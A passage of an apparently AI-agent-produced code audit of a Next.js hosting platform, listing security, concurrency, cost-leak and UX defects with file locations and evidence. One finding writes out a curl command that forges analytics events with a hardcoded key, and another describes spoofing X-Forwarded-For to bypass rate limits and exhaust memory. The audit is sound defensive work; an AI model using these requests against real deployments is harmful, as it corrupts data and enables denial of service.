- **Agent says it ruled out:** Grepped for any trusted-proxy / hop-count handling of X-Forwarded-For — there is none; both call sites take `[0]` unconditionally. Checked for Redis or any shared store behind the limiters: src/lib/security/index.ts:6 says `// Rate limiter storage (in-memory for development, use Redis in production)` and src/proxy.ts:21 uses a plain `new Map()`. Checked for a WAF/Cloud Armor config in the repo (next.config.ts, Dockerfile, .github/) — none present.

### 🟡 MEDIUM — No Content-Security-Policy is emitted anywhere, on the dashboard or on proxied tenant pages
- **Location:** `src/proxy.ts:12`
- **Category:** `missing-csp`
- **Failure scenario:** `grep -rn "Content-Security-Policy\|contentSecurityPolicy\|frame-ancestors" src/ next.config.ts` returns nothing. Consequences that are concrete rather than theoretical: (1) the dashboard loads a third-party script from `https://checkout.razorpay.com/v1/checkout.js` (src/app/billing/page.tsx:228) with no `script-src` restriction and no SRI, so a compromise of that CDN yields arbitrary JS in a page that renders decrypted environment variables and database result sets; (2) the reverse proxy rewrites every tenant response and re-serves it from `<slug>.<app-domain>` (src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:196-203) with no CSP and with the tenant's own `x-frame-options` explicitly stripped at line 170, so a stored XSS inside any customer's app runs unconstrained on a subdomain that is same-site with the dashboard — which is exactly the position needed to mount the cookie-tossing and CSRF attacks described in the other findings; (3) there is no `frame-ancestors` fallback, so framing protection rests entirely on the legacy `X-Frame-Options` header.
- **Impact:** Removes the last containment layer for every script-injection path in the product. Because the platform intentionally hosts customer-controlled HTML on subdomains of its own origin, script execution on `*.<app-domain>` is not a hypothetical — it is a supported product feature — and there is no policy limiting what that script may connect to, load, or frame.
- **Evidence:**

```ts
src/proxy.ts:11-18 — the complete set of headers applied to every response
const securityHeaders = {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
};

next.config.ts:33-42 — the only configured header is unrelated to security policy
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-DNS-Prefetch-Control',
            value: 'on',

src/lib/security/index.ts:123-130 — the shared `securityHeaders` export also has no CSP
```
- **Agent says it ruled out:** Grepped `Content-Security-Policy`, `contentSecurityPolicy`, `frame-ancestors`, `Strict-Transport` across src/, next.config.ts, Dockerfile and .github/ — zero hits. Confirmed next.config.ts's `headers()` returns only X-DNS-Prefetch-Control and that its comment `// Security headers are handled by middleware` points at src/proxy.ts, which has no CSP either. Confirmed the app has no `dangerouslySetInnerHTML` with dynamic data (the single occurrence, src/app/dashboard/layout.tsx:27, is a static string) — so this is reported as a missing containment control, not as an exploitable injection on its own.

### 🟡 MEDIUM — Hardcoded API key `deployify-dashboard-internal` bypasses API-key verification on the public analytics ingest endpoint
- **Location:** `src/app/api/v1/collect/route.ts:66`
- **Category:** `hardcoded-credential`
- **Failure scenario:** The literal string is a shared secret compiled into the route and is trivially discoverable — any visitor to a proxied tenant site can read the injected `<script src="/deployify-insights.js" data-api-key="...">` tag pattern, and the endpoint accepts unauthenticated cross-origin POSTs by design. Anyone can `curl -X POST https://<app-domain>/api/v1/collect -d '{"apiKey":"deployify-dashboard-internal","type":"pageview","path":"/anything"}'` and have the event stored under `projectId: 'deployify-dashboard'`. Combined with the X-Forwarded-For rate-limit bypass in the previous finding, the volume is unbounded.
- **Impact:** Anonymous write access to the platform operator's own analytics dataset: forged pageviews and Web-Vitals metrics land in Firestore (`Collections.ANALYTICS_EVENTS`) and are dual-written to BigQuery (lines 92-99) with attacker-chosen `path`, `referrer`, `userAgent` and (spoofable) `ip`. That corrupts the operator's own product metrics and creates a metered Firestore-write + BigQuery-streaming-insert cost per request with no authentication.
- **Evidence:**

```ts
src/app/api/v1/collect/route.ts:63-75
        // Verify API Key (or allow internal dashboard key)
        let projectId = '';
        const isInternal = apiKey === 'deployify-dashboard-internal';

        if (isInternal) {
            projectId = 'deployify-dashboard';
        } else {
            const project = await getProjectByApiKey(apiKey);
            if (!project) {
                return NextResponse.json({ error: 'Invalid apiKey' }, { status: 401 });
            }
            projectId = project.id;
        }

src/app/api/v1/collect/route.ts:112-120 (endpoint is deliberately open to every origin)
        headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
```
- **Agent says it ruled out:** Traced `getProjectByApiKey` (src/lib/db.ts:696) to confirm real keys are looked up in Firestore and that the `isInternal` branch short-circuits that lookup entirely. Checked whether the constant is loaded from configuration — it is not; it is an inline literal, and `grep -rn 'deployify-dashboard-internal'` shows no env-var indirection. Verified the rate limiter in front of it is bypassable (see the X-Forwarded-For finding), so the 20/min cap is not a mitigation. Noted that the `Access-Control-Allow-Origin: '*'` is on the OPTIONS response only and no credentials are involved, so the wildcard CORS itself is not the defect — the unauthenticated magic key is.

> **Coverage notes (D9):** Swept for the assigned dimension and read every hit end-to-end.

XSS sinks — clean, and I am explicitly reporting no XSS finding rather than inventing one. `grep -rn "dangerouslySetInnerHTML|innerHTML|outerHTML|insertAdjacentHTML|eval\(|new Function|document.write" src/ public/` yields exactly one hit: src/app/dashboard/layout.tsx:27, a static `window.location.href = '/login';` string with no interpolation. src/components/ui/query-editor.tsx:96-99 builds DOM nodes with `textContent`, not HTML. All ~69 components render values as JSX children (React-escaped). public/deployify-insights.js never touches the DOM — it only reads `document.currentScript` attributes and posts JSON.

Dynamic hrefs / tabnabbing — checked all 9 `href={...}` sites. `project.repoUrl` and `deployment.url` come from GitHub/Cloud Run; `productionUrl` is written only by src/lib/deployment.ts:137 from the Cloud Run response, not by user input; `href={`https://${domain.domain}`}` has a hardcoded scheme prefix. The six `target="_blank"` sites lack `rel="noopener"`, but every current browser applies noopener implicitly to `target="_blank"` — I dropped this as not genuinely exploitable.

CSP / clickjacking — reported. Note that `X-Frame-Options: DENY` from src/proxy.ts:58-59 does reach the client on rewrites (middleware response headers are merged into the rewritten response), so I did *not* report the `x-frame-options` strip at proxy route line 170 as a clickjacking hole for the dashboard; its real significance is that it silently removes a framing defence the *tenant* set for their own site, which I folded into the CSP finding.

CORS — the only `Access-Control-*` headers in the codebase are the three on the OPTIONS handler of /api/v1/collect. No credentialed endpoint sets permissive CORS, and no route reflects an Origin. The wildcard there is appropriate for an anonymous beacon; the actual defect is the hardcoded key, reported separately.

CSRF — enumerated all 84 route handlers under src/app/api/**. Zero use Origin, Referer, Sec-Fetch-Site, or a CSRF token. I checked for GET-with-side-effects and found only the two OAuth handlers (intended), storage metrics, and /api/cron/optimize. I deliberately did not report plain cross-site CSRF, since SameSite=Lax does block it; the finding is scoped to the same-site sibling-subdomain vector that the tenant proxy creates, which Lax does not cover.

Ruled out after investigation: src/app/edge-debug/actions.ts runs user code through node `vm` (not a real sandbox) but is gated by `NODE_ENV !== 'development' && !== 'test' && !process.env.SIMULATION_ALLOWED`, and `SIMULATION_ALLOWED` appears nowhere outside the test file and is absent from env.example — so it is not reachable in production. The `analyticsApiKey` interpolated into the injected script tag at proxy route lines 154/185 is never written by any code path, so it is not an attribute-injection vector.

Not covered: I did not audit the ~92 lib modules or the billing webhook signature verification (other dimensions), did not review src/middleware/rbac.ts's role matrix in depth beyond confirming it is provenance-agnostic, and did not exercise anything at runtime — every finding is from static reading, with the two URL-parsing and Headers-iteration claims verified by running Node locally.


## D10. Reliability, concurrency & correctness  <sub>`reliability-races`</sub>

### 🔴 CRITICAL — Every successful deployment — including PR previews and branch builds — overwrites project.productionUrl, so the public reverse proxy starts serving the preview build
- **Location:** `src/lib/deployment.ts:136`
- **Category:** `state-corruption`
- **Failure scenario:** A contributor opens PR #42. src/app/api/webhooks/github/route.ts:562 computes `projectSlug = getProjectSlugForDeployment(project, deployment)` = `myapp-pr-42` and passes it to `pollBuildStatus(...)` (line 600-614). When the preview build succeeds, syncDeploymentStatus builds `serviceName = dfy-myapp-pr-42`, resolves its Cloud Run URL, and then executes `updateProject(projectId, { productionUrl: 'https://dfy-myapp-pr-42-....run.app' })`. The same happens for any non-default branch push (deploy/route.ts:120 sets type 'branch', slug becomes `myapp-feature-x`). src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:91-103 resolves the public site by reading `project.productionUrl` and proxies every request there, so from that moment the project's public entry point serves the unreviewed PR build. The dashboard 'Visit' link (src/app/dashboard/[id]/page.tsx:236) and the analytics site-id derivation (analytics/page.tsx:54-63) also switch to the preview URL. The value is never restored until the next *production* deploy succeeds.
- **Impact:** Unreviewed preview/branch code is served to real end users through the project's public proxy URL, and analytics are attributed to the wrong origin. A PR from any collaborator silently replaces production.
- **Evidence:**

```ts
// deployment.ts:82-83, 108 — serviceName/URL are derived from the *per-deployment* slug
    const serviceName = generateServiceName(projectSlug);
    const serviceUrl = await getCloudRunServiceUrl(serviceName, projectRegion);
...
    const effectiveUrl = serviceUrl || `https://${serviceName}-${projectNumber}.${region || config.gcp.region}.run.app`;

// deployment.ts:136-138 — written unconditionally, with no check on deployment.type
            await updateProject(projectId, {
                productionUrl: effectiveUrl,
            });
```
- **Agent says it ruled out:** grep -rn 'productionUrl:' src/lib src/app/api shows the only real write is src/lib/deployment.ts:137 (plus the simulation at :400) — there is no compensating write that restores it. syncDeploymentStatus does branch on deployment.type, but only for the database-branching block at line 171 (`if (deployment.type === 'preview' && pullRequestNumber)`), proving the type is available at that point and simply is not consulted for the productionUrl write. The proxy route has no deployment-type filter either.

### 🟠 HIGH — syncDeploymentStatus has no idempotency guard, and three independent pollers race it — duplicate usage-quota increments, duplicate emails, duplicate PR comments
- **Location:** `src/lib/deployment.ts:40`
- **Category:** `idempotency`
- **Failure scenario:** The check at line 40 is a check-then-act on a value read from Firestore with no lock, lease, or transaction, and the terminal write happens ~1-3 s later (after getBuildStatus, getCloudRunServiceUrl, getGcpProjectNumber, getService). Three callers hit the same deployment concurrently while it is building: (a) src/app/dashboard/[id]/deployments/page.tsx:50 polls GET /api/projects/[id]/deployments every 5 s, which calls syncDeploymentStatus for every active deployment (deployments/route.ts:48-70); (b) src/components/DeploymentLogsModal.tsx:54 polls GET .../deployments/[deployId]/logs every 3 s, which calls syncDeploymentStatus for the same deployment (logs/route.ts:37-56); (c) the in-process `setTimeout(poll, 30000)` chain in deployment.ts:342. With the logs modal open on the deployments page, two requests land inside the same 3 s window in which the build flips to SUCCESS. Both read status 'building', both pass line 40, and both run the SUCCESS branch: `trackDeployment` (billing/tracker.ts:29-37) fires `FieldValue.increment(1)` on totalDeployments and increments totalBuildMinutes twice; two 'Deployment Success' emails are sent (line 158); two identical '🚀 Deploy Preview Ready!' PR comments are posted (line 209); two Discord/Slack webhook messages fire (line 245 on the failure path).
- **Impact:** Usage counters that gate paid tiers are inflated (a user is charged for 2 deployments and 2x build minutes for one build), and customers receive duplicate notification emails, duplicate PR comments, and duplicate chat webhooks on every raced build completion.
- **Evidence:**

```ts
const deployment = await getDeploymentById(deploymentId);
    if (!deployment) return null;

    // If already in a terminal state, return immediately
    if (deployment.status === 'ready' || deployment.status === 'error' || deployment.status === 'cancelled') {
        return deployment;
    }
...
// line 134 — inside the SUCCESS branch, reached by every racing caller
            await trackDeployment(projectId, buildDurationMs);
```
- **Agent says it ruled out:** grep -rn 'runTransaction' src/ returns only the mock shim in src/lib/firebase.ts:245 — no Firestore transaction is used anywhere in the app. There is no 'notified'/'processed' flag on the deployment document (updateDeployment at db.ts:1266 is a plain .update()), and no conditional write/precondition. trackDeployment uses FieldValue.increment, which makes each call atomic but does NOT make the caller idempotent — that is exactly why the double call double-counts.

### 🟠 HIGH — Automated PlanetScale token rotation runs from an unguarded GET and deletes every other 'deployify-rotation-*' password, so two overlapping syncs revoke the credential that is live in Secret Manager
- **Location:** `src/lib/gcp/external-sync.ts:598`
- **Category:** `race-condition`
- **Failure scenario:** The trigger is src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:446-457: `if (daysSinceRotation >= 30 && (storage.type === 'neon' || storage.type === 'planetscale')) { const rotateResult = await rotateProviderToken(id, storage); ... storage.lastRotatedAt = now; ... await updateProject(...) }`. The `lastRotatedAt` guard is only persisted AFTER the whole multi-second rotation finishes, and the handler is a plain GET with no lock. Two overlapping sync calls (two dashboard tabs, a double-clicked Sync button, or handleUpdateBackupPolicy at StorageSection.tsx:825 firing while a manual sync at :592 is in flight) both read lastRotatedAt > 30 days and both rotate. Interleaving: A creates password A; B creates password B; B writes conn-string B to Secret Manager; B's cleanup deletes password A; A then writes conn-string A over B's (line 582); A's cleanup deletes password B. Final state: Secret Manager holds credentials for password A, which PlanetScale has already deleted, and password B is gone too. Every Cloud Run revision that mounts this secret (cloudbuild.ts:388-399 --set-secrets) fails authentication on its next connection/cold start.
- **Impact:** Total, self-inflicted database outage for the deployed application, requiring manual credential recovery in the PlanetScale console. The rotation is fully automatic (30-day timer), so it fires without any user action.
- **Evidence:**

```ts
// external-sync.ts:577-603 — create new password, write it to Secret Manager, then delete all the others
            const newPwd = await createRes.json();
            const newConnStr = `mysql://${newPwd.username}:${newPwd.plain_text}@${newPwd.access_host}/${database}?ssl={"rejectUnauthorized":true}`;
            if (storage.connectionStringSecretId) {
                await upsertSecret(storage.connectionStringSecretId, newConnStr);
            }
            ...
                    const oldPasswords = passwords.filter((p: { name?: string; id?: string }) =>
                        p.name?.startsWith('deployify-rotation-') && p.id !== newPwd.id
                    );
                    for (const oldPwd of oldPasswords) {
                        await fetch(`.../passwords/${oldPwd.id}`, { method: 'DELETE', ... });
                    }
```
- **Agent says it ruled out:** Searched sync/route.ts for any mutex/lease/in-progress flag around the rotation block — there is none; the only guard is the post-hoc `storage.lastRotatedAt = now` write at line 450. grep -rn 'runTransaction' src/ confirms no transactional compare-and-set exists. The cleanup filter excludes only `newPwd.id`, so it provably deletes a concurrently created sibling password rather than skipping it.

### 🟠 HIGH — Concurrent replica creation loses one write to the storageConfigs array, leaving a paid Cloud SQL read replica running, untracked and undeletable
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/replica/route.ts:103`
- **Category:** `lost-update`
- **Failure scenario:** `storageConfigs` comes from `checkProjectAccess` (line 33), i.e. a plain document read, and `updateProject` (src/lib/db.ts:1117-1123) is a plain `.update()` that replaces the whole array — a textbook read-modify-write with no precondition. Two admins (or one admin and the auto-align/failover writer in sync/route.ts:184) click 'Create replica' within the ~30 s window that `createReadReplica` takes: both read the array at t0, both call the Cloud SQL API and get real replicas `mydb-replica-a1b2` and `mydb-replica-c3d4` created, then A writes [.. replicas:[A]] and B writes [.. replicas:[B]]. A's entry is gone. The DELETE handler in the same file (line 168-178) can only delete replicas found in `storage.metadata.replicas`, so `mydb-replica-a1b2` can never be removed through the product. The same lost-update pattern applies to every one of the ~20 routes that rewrite the whole storageConfigs array (migrate-region/route.ts:57, backups/route.ts:145, export/route.ts:67, import/route.ts:71, sync/route.ts:282 …).
- **Impact:** A billable Cloud SQL read replica (db-custom tiers run tens to hundreds of USD/month) runs forever, invisible in the dashboard and unreachable by the delete endpoint. More generally, any two concurrent storage operations on one project silently discard one another's state.
- **Evidence:**

```ts
// The GCP resource is created first (line 61):
            const operationName = await createReadReplica(masterInstanceName, replicaInstanceName, region, tier);
...
// then the entire storageConfigs array read at line 33 is written back wholesale:
        const replicas = (storage.metadata?.replicas as unknown[]) || [];
        storage.metadata = {
            ...storage.metadata,
            replicas: [...replicas, replica]
        };

        const updatedConfigs = storageConfigs.map(s => s.id === storageId ? storage : s);
        await updateProject(id, { storageConfigs: updatedConfigs });
```
- **Agent says it ruled out:** grep -rn 'runTransaction|FieldValue.arrayUnion' src/ finds no transaction and no arrayUnion anywhere — only FieldValue.increment in billing/tracker.ts. src/lib/db.ts:1117 confirms updateProject does an unconditional `.update()`. The 'purge orphans' path (src/app/api/gcp/discover/route.ts:97) cannot help: src/lib/gcp/discovery.ts:92-93 only flags a resource orphaned when `item.name.includes('-pr-') || item.name.includes('-branch-')`, and a replica is named `<master>-replica-<suffix>`, so it is never flagged.

### 🟠 HIGH — No serialization or supersede-cancel between builds of the same project: an older commit's build can win the Cloud Run traffic race and the newer deployment records the wrong revision
- **Location:** `src/app/api/projects/[id]/deploy/route.ts:123`
- **Category:** `race-condition`
- **Failure scenario:** Two commits are pushed to main 30 s apart (or a user clicks Deploy twice). handlePushEvent (webhooks/github/route.ts:129-194) creates and submits build #1 for commit A, then build #2 for commit B; both target the identical service name `dfy-<slug>` (generateServiceName on the same production slug) and Cloud Build runs them in parallel. Build durations vary by minutes depending on Docker layer/GCS cache hits (cloudbuild.ts:216-221 restores a cache both builds share and both overwrite at gs://<bucket>/<projectSlug>.tgz). If build A finishes last, its `gcloud run deploy` + `update-traffic --to-latest` puts commit A's revision at 100%, so production serves the OLDER commit while the dashboard shows deployment B as the newest 'ready' one. Independently, deployment.ts:92-95 records `latestRevision = service.latestReadyRevision` read at sync time rather than the revision this build produced, so deployment B's row can store A's revision name; a later rollback to B (deployments/[deployId]/rollback/route.ts:47 → updateTraffic) then routes traffic to the wrong code.
- **Impact:** Silent production regression — the platform reports the newest commit as live while serving an older one — plus corrupted deployment→revision mapping that makes rollback target the wrong build.
- **Evidence:**

```ts
// deploy/route.ts:123 — a deployment row is created with no check for an in-flight build
        const deployment = await createDeployment({
            projectId: project.id,
            type: deploymentType,
            status: 'queued',
...
// deploy/route.ts:202 — and submitted immediately
                const { buildId, logUrl } = await submitCloudBuild(buildConfig, project.region);

// cloudbuild.ts:404-411 — every build ends by grabbing 100% of traffic
            args: [
                'run', 'services', 'update-traffic', serviceName,
                '--region', region,
                '--to-latest',
            ],
```
- **Agent says it ruled out:** grep -rn "status === 'building'" across src/app/api shows the only matches are the read-only freshness filters in projects/[id]/route.ts:49, deployments/route.ts:45 and logs/route.ts:38 — there is no guard that rejects or supersedes a deploy while another is in flight, and no call to cancelBuild on a prior build (cancelBuild is only reachable from the manual DELETE at deploy/route.ts:354). Cloud Build applies no per-service serialization; the config sets no concurrency/queue option (cloudbuild.ts:511-517, 531-537).

### 🟡 MEDIUM — Completing a Cloud SQL regional migration overwrites resourceName with the clone and abandons the source instance, which is then billed forever with no reference to it anywhere
- **Location:** `src/app/api/projects/[id]/storage/[storageId]/sync/route.ts:717`
- **Category:** `resource-leak`
- **Failure scenario:** migrateInstanceToRegion (src/lib/gcp/cloudsql.ts:718-762) is a Cloud SQL *clone*: it creates a brand-new instance named `${instanceName}-${targetRegion}` and leaves the source instance running. It is triggered either by POST .../migrate-region (route.ts:44) or automatically by the auto-align block in this same sync GET (sync/route.ts:161-185, which fires whenever `storage.autoAlign` is set and the connector's region differs from the project's). When the clone operation reports DONE, the block above repoints `resourceName` at the clone and deletes `targetInstanceName` from metadata. The original instance `myapp-db` is now referenced by nothing in Firestore: the connection-string secret is rewritten to the clone (line 733-736), and no code path deletes it. A user who flips autoAlign on a db-custom-2-7680 instance silently ends up paying for two identical Cloud SQL instances indefinitely.
- **Impact:** Permanent duplicate Cloud SQL billing (easily 100+ USD/month per migrated instance) plus an abandoned instance still holding customer data, with no UI or API able to find or remove it.
- **Evidence:**

```ts
} else if (lastOp === 'migrate_region') {
                // Regional migration finished. Update resource name and region.
                const targetInstanceName = storage.metadata?.targetInstanceName as string;
                const targetRegion = storage.metadata?.targetRegion as string;

                storage.status = 'active';
                storage.region = targetRegion;
                storage.metadata = {
                    ...storage.metadata,
                    resourceName: targetInstanceName || storage.metadata?.resourceName,
                    region: targetRegion || storage.metadata?.region,
                    lastOperation: undefined,
                    operationName: undefined,
                    targetInstanceName: undefined,
                    targetRegion: undefined
                };
```
- **Agent says it ruled out:** grep -rn 'deleteInstance' src/ shows the only callers are the replica DELETE handler (replica/route.ts:178), the storage delete route, and the manual discover purge (api/gcp/discover/route.ts:97) — none of them runs after a migration and none knows the old name. src/lib/gcp/discovery.ts:92-93 only marks a resource `isOrphaned` when its name contains '-pr-' or '-branch-', so a plainly named source instance is never surfaced for purge. The failover_promotion branch at line 750-772 has the same shape (old primary abandoned).

### 🟡 MEDIUM — pruneProjectImages deletes tagged Artifact Registry versions without force=true and never inspects the response, so image pruning is a silent no-op and the registry grows without bound
- **Location:** `src/lib/gcp/artifacts.ts:86`
- **Category:** `resource-leak`
- **Failure scenario:** Every image this platform pushes carries tags: cloudbuild.ts:93-94 builds `<...>/<serviceName>:<commitSha7>` and `<...>/<serviceName>:latest`, and both are pushed (steps at cloudbuild.ts:300-308). The Artifact Registry versions.delete endpoint refuses to delete a version that still has tags unless `?force=true` is supplied, returning FAILED_PRECONDITION. This call omits `force` entirely and, unlike the sibling deleteProjectImages (artifacts.ts:31-35, which at least checks `response.ok`), never looks at the response, so every rejection is discarded. The caller is fire-and-forget with a catch that can therefore never fire (deployment.ts:141-143: `pruneProjectImages(serviceName, 10, projectRegion).catch(...)`). A project deploying 20x/day with a 1 GB image accumulates ~600 GB of Artifact Registry storage per month while operators believe only 10 versions are retained. Even in the branch where the API would accept the delete, a non-2xx response (403 on a missing artifactregistry.versions.delete permission, 429 on quota) is equally invisible.
- **Impact:** Unbounded, silently growing Artifact Registry storage cost on every project, and a retention guarantee ('keep 10') that the code never actually enforces or reports on.
- **Evidence:**

```ts
// 4. Delete each old version
        for (const version of toDelete) {
            // version.name is already the full path: projects/*/locations/*/repositories/*/packages/*/versions/*
            await fetch(
                `${ARTIFACT_REGISTRY_API}/${version.name}`,
                {
                    method: 'DELETE',
                    headers: {
                        'Authorization': `Bearer ${accessToken}`,
                    },
                }
            );
        }
```
- **Agent says it ruled out:** Searched artifacts.ts end to end: no `force` query parameter is built anywhere and no other prune/GC path exists. grep -rn 'pruneProjectImages' src/ shows the single caller in deployment.ts:141 wrapped in .catch, which only catches the surrounding try/catch's rethrow — but the function swallows everything in its own try/catch at artifacts.ts:98-100 as well, so no failure ever reaches a log with actionable detail.

### 🟡 MEDIUM — Public analytics ingest keeps an in-memory rate-limit Map that is never pruned and is keyed on the caller-controlled X-Forwarded-For prefix
- **Location:** `src/app/api/v1/collect/route.ts:11`
- **Category:** `unbounded-memory`
- **Failure scenario:** /api/v1/collect is the unauthenticated public ingest endpoint used by public/deployify-insights.js, so anyone can POST to it. Cloud Run appends to X-Forwarded-For rather than replacing it, so `split(',')[0]` is the value the *caller* supplied. An attacker (or simply a large volume of real IPv6 visitors, where masking only zeroes the last hextet at line 39-41) sends requests with a fresh X-Forwarded-For each time; each distinct value inserts a permanent entry into rateLimitMap. Nothing ever deletes entries — there is no TTL sweep, no size cap, and no eviction anywhere in the file — so the Map grows for the entire lifetime of the container until the Cloud Run instance exceeds its memory limit and is OOM-killed, dropping every in-flight request on that instance. The same forged header simultaneously resets the 20-req/min counter, so the rate limiter provides no back-pressure while the leak runs.
- **Impact:** Remote, unauthenticated memory-exhaustion of the control-plane service (which also serves the dashboard and the public reverse proxy), plus a rate limiter that is trivially bypassed and therefore cannot slow the attack down.
- **Evidence:**

```ts
const rateLimitMap = new Map<string, { count: number; lastReset: number }>();
const RATE_LIMIT = 20; // 20 requests
const WINDOW_MS = 60 * 1000; // per minute
...
        let ip = req.headers.get('x-forwarded-for')?.split(',')[0] ||
            req.headers.get('x-real-ip') ||
            'unknown';
...
        rateInfo.count++;
        rateLimitMap.set(ip, rateInfo);
```
- **Agent says it ruled out:** Read the whole route: no cleanup, no LRU, no max-size check, and the Map is module scope so it persists across requests. Contrast with the other limiter in src/lib/security/index.ts:19-22, which does sweep (`if (Math.random() < 0.01) cleanupExpiredEntries();`) — that mitigation exists in the codebase but is deliberately not used here, and checkRateLimit is never called from this route. No proxy-level or middleware rate limit covers /api/v1/collect (grep for checkRateLimit shows no call from src/proxy.ts for this path).

> **Coverage notes (D10):** Swept for reliability/concurrency/correctness defects (explicitly excluding pure authz/security issues, which I left to the security dimension). Files read end-to-end: src/lib/deployment.ts, src/lib/gcp/cloudbuild.ts, src/lib/gcp/cloudrun.ts, src/lib/gcp/artifacts.ts, src/app/api/projects/[id]/deploy/route.ts, .../deployments/route.ts, .../deployments/[deployId]/{logs,alias,rollback}/route.ts, .../rollback/route.ts, src/app/api/webhooks/github/route.ts, src/app/api/v1/collect/route.ts, src/app/api/v1/proxy/[slug]/[[...path]]/route.ts, and the storage routes replica/{,promote}, backups, cutover, migrate-region, plus src/app/api/projects/[id]/storage/[storageId]/sync/route.ts (1128 lines, read in full across the health/metrics/recovery/operation-completion sections). Also read src/lib/billing/{tracker,caps}.ts, src/lib/gcp/{discovery,external-sync,cloudsql excerpts}.ts, src/lib/db.ts (updateProject/updateDeployment/getEnvVarsForDeployment), src/lib/security/index.ts, src/lib/utils.ts helpers, and the polling UI (dashboard/[id]/deployments/page.tsx, DeploymentLogsModal.tsx, StorageSection.tsx).

Repo-wide sweeps performed: `runTransaction|FieldValue.arrayUnion|FieldValue.increment` (only increment, in billing/tracker.ts — the whole app has zero Firestore transactions), module-level mutable state / setInterval / globalThis, `deleteInstance` callers, `productionUrl` writers, `syncDeploymentStatus|pollBuildStatus` callers, and `'provisioning'` state transitions.

Things I looked at and deliberately did NOT report, so they are not re-investigated: (1) the setTimeout-based pollBuildStatus chain surviving Cloud Run CPU throttling — real, but genuinely mitigated by the lazy syncDeploymentStatus calls on three GET routes; (2) N+1 sequential Secret Manager fetches in getEnvVarsForDeployment (db.ts:255-400) and getMonthlyUsage's per-project Monitoring calls — only on the deploy path, not hot enough; (3) JSON.parse of the GitHub webhook body (webhooks/github/route.ts:46) — inside the outer try/catch; (4) the StorageSection metrics useEffect re-creating its 60 s interval on every state change (StorageSection.tsx:731-746) — jittery but self-correcting; (5) Cloud Build statuses INTERNAL_ERROR and EXPIRED skipping the failure branch in deployment.ts:221 (no errorMessage, no email/webhook/PR comment, GitHub commit status stuck 'pending') — a real medium-severity gap that just missed the 8-finding cap, worth fixing alongside finding #2.

Not covered (out of assigned scope or not reachable in the time budget): billing webhook idempotency (src/app/api/billing/webhook/route.ts), the Razorpay/Stripe reconciliation paths, src/lib/gcp/monitoring.ts (1133 lines), storage-validator.ts, ingestion.ts orchestrateCutover internals, the crons/scheduler write paths, and the ~60 other storage sub-routes that share the same whole-array storageConfigs read-modify-write pattern documented in finding #4. I also did not run tests or lint (baseline was pre-measured). Several routes in the storage tree lack a role check that their siblings have (rollback/route.ts, migrate-region/route.ts, backups GET/POST/PATCH allow 'viewer' where deploy/route.ts:44 and env/route.ts:72 reject it) — flagged here only as a pointer, since authorization belongs to another dimension.


## D11. Product & UX quality  <sub>`product-ux`</sub>

### 🟠 HIGH — Redeploy and Cancel always show a green success toast, even when the API rejects the request with a 403/400
- **Location:** `src/app/dashboard/[id]/page.tsx:86`
- **Category:** `false-success-feedback`
- **Failure scenario:** A Free-plan customer at their 20-deployment monthly cap opens /dashboard/<id> and clicks "Redeploy". /api/projects/[id]/deploy returns 403 with `{error: "Usage limit exceeded: deployments. Please upgrade your plan."}`. redeployProject sees `!response.ok`, skips fetchDeployments, logs nothing user-visible, and resolves. handleRedeploy then fires `toast.success('Deployment triggered')`. The user sees a green success toast, no new row appears in the deployment list, and they have no way to learn they hit a quota. Identical for a `viewer`-role teammate (403) and for a repo that fails pre-flight validation (400 with a specific `validation.error`). handleCancel has the same shape: it reports "Deployment cancelled" while the build keeps running and keeps burning billable build minutes.
- **Impact:** The two most-used buttons on the project page lie about success. Users retry, escalate to support, or silently lose deployments. The upgrade prompt — the one message that would convert a capped Free user to Pro — is generated by the server and discarded by the client, so quota exhaustion reads as a broken product rather than a paywall.
- **Evidence:**

```ts
src/app/dashboard/[id]/page.tsx:86-98
    const handleRedeploy = async (force = false) => {
        if (!project) return;
        const toastId = toast.loading(force ? 'Triggering force redeploy (ignoring cache)...' : 'Triggering deployment...');
        await redeployProject(project.id, force);
        toast.success('Deployment triggered', { id: toastId });
    };

    const handleCancel = async (deploymentId: string) => {
        if (!project) return;
        const toastId = toast.loading('Cancelling deployment...');
        await cancelDeployment(project.id, deploymentId);
        toast.success('Deployment cancelled', { id: toastId });
    };

src/store/project-slice.ts:220-238 (the action returns Promise<void> and swallows every non-2xx):
    redeployProject: async (projectId, force = false) => {
        set({ isRedeploying: true });
        try {
            const response = await f
… (truncated)
```
- **Agent says it ruled out:** Grepped the whole file for `res.ok`/`response.ok` in the redeploy path (only 1 `.ok` in src/app/dashboard/[id]/page.tsx, at line 121 in confirmRollback — which does handle errors correctly, proving the pattern is known here). Read src/store/project-slice.ts:220-252 in full: no toast, no error state, no return value; the ProjectSlice interface at lines 58-59 types both as `Promise<void>` so the caller cannot check. Confirmed no global fetch interceptor or error boundary exists (no wrapper around fetch anywhere in src/store).

### 🟠 HIGH — Dashboard silently renders the first-run "Welcome to Deployify" onboarding screen whenever /api/projects fails
- **Location:** `src/app/dashboard/page.tsx:79`
- **Category:** `error-state-masquerading-as-empty-state`
- **Failure scenario:** A customer with 20 live projects leaves a dashboard tab open past JWT expiry, or Firestore has a blip. On focus/team-switch the effect refires; /api/projects returns 401 or 500. `response.json()` succeeds (both are JSON), `data.projects` is undefined, `setProjects([])` runs, `loading` flips false, and the page renders `<OnboardingGuide />`: "Welcome to Deployify — Connect GitHub / Import Project". The fleet-health header at line 127 is also gated on `projects.length > 0` so it vanishes too. The user's honest read is that their entire account was wiped. Same outcome on a 500 that returns an HTML error page: `.json()` throws, the catch only console.errors, `projects` stays `[]`, onboarding renders.
- **Impact:** The single worst error state a hosting platform can show a paying customer: total data loss, presented calmly as a welcome screen, with no error text and no retry control. There is no path back other than a manual reload, and a user who believes their projects are gone opens a P1 ticket or churns.
- **Evidence:**

```ts
src/app/dashboard/page.tsx:71-87
        async function fetchProjects() {
            setLoading(true);
            try {
                let url = '/api/projects';
                if (activeTeam) { url += `?teamId=${activeTeam.id}`; }
                const response = await fetch(url);
                const data = await response.json();
                setProjects(data.projects || []);
            } catch (error) {
